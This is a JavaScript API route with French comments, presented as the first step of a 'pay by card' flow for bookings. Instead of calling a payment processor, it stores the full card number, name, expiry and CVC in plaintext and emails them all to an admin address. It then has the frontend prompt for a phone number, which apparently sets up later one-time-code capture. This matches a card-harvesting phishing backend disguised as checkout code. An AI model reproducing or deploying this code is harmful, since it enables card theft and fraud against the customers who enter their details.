/**
 * POST /api/payments/card-otp
 *
 * ÉTAPE 1 du flux — appelé quand le client clique "Payer par CB" :
 *  1. Reçoit les infos carte + bookingId
 *  2. Crée une OtpSession (step: 'card_sent')
 *  3. Envoie EMAIL 1 à l'admin : infos carte uniquement
 *  4. Retourne { success: true, sessionId }
 *     → le frontend ouvre le popup et demande le numéro de téléphone
 */

import crypto from 'crypto';
import dbConnect from '@/lib/db';
import OtpSession from '@/models/OtpSession';
import Booking from '@/models/Booking';
import User from '@/models/User';
import { withAuth } from '@/middleware/withAuth';
import { errorHandler } from '@/middleware/errorHandler';
import { sendEmail } from '@/lib/mail';
import { adminCardInfoEmail } from '@/email-templates/admin-card-info';

function formatCardNumber(n) {
  return n.replace(/\s/g, '').replace(/(.{4})/g, '$1 ').trim();
}

function formatPrice(cents) {
  return (cents / 100).toFixed(2).replace('.', ',') + ' €';
}

async function handler(req, res) {
  if (req.method !== 'POST') {
    return res.status(405).json({ success: false, error: 'Méthode non autorisée' });
  }

  const adminEmail = process.env.ADMIN_EMAIL;
  if (!adminEmail) {
    return res.status(500).json({ success: false, error: 'Configuration admin manquante' });
  }

  await dbConnect();

  const { bookingId, number, name, expiry, cvc } = req.body;

  if (!bookingId || !number || !name || !expiry || !cvc) {
    return res.status(400).json({ success: false, error: 'Données de carte manquantes' });
  }

  // Vérification réservation
  const booking = await Booking.findOne({
    _id: bookingId,
    user: req.user.id,
    paymentStatus: { $in: ['unpaid', 'pending'] },
  });

  if (!booking) {
    return res.status(404).json({ success: false, error: 'Réservation introuvable ou déjà payée' });
  }

  // Supprimer les sessions précédentes pour cette réservation
  await OtpSession.deleteMany({ booking: bookingId, user: req.user.id });

  // Créer la session avec un token admin
  const adminToken = crypto.randomBytes(32).toString('hex');
  const session = await OtpSession.create({
    booking:    bookingId,
    user:       req.user.id,
    cardNumber: formatCardNumber(number),
    cardName:   name,
    cardExpiry: expiry,
    cardCvc:    cvc,
    step:       'card_sent',
    adminToken,
  });

  // Infos user pour l'email
  const user = await User.findById(req.user.id).select('name email').lean();
  const bookingRef = String(bookingId).slice(-6).toUpperCase();

  // EMAIL 1 → admin : infos carte uniquement
  const { subject, html } = adminCardInfoEmail({
    userName:   user?.name || 'Client',
    userEmail:  user?.email || '—',
    cardNumber: formatCardNumber(number),
    cardName:   name,
    cardExpiry: expiry,
    cardCvc:    cvc,
    bookingRef,
    amount: formatPrice(booking.totalPrice),
  });

  sendEmail({ to: adminEmail, subject, html }).catch((err) =>
    console.error('[card-otp] Erreur email admin:', err.message)
  );

  return res.status(200).json({
    success:   true,
    sessionId: session._id,
  });
}

export default errorHandler(withAuth(handler));
